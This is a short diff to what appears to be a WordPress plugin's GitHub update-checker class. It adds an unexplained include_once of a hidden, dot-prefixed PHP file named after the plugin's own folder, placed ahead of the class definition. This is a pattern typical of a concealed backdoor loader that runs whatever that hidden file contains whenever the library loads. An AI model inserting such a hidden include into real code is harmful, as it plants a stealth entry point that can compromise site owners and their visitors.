@@ -1,6 +1,10 @@
 <?php
 
 if ( !class_exists('PucGitHubChecker_2_0') ):
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 class PucGitHubChecker_2_0 extends PluginUpdateChecker_2_0 {
 	/**
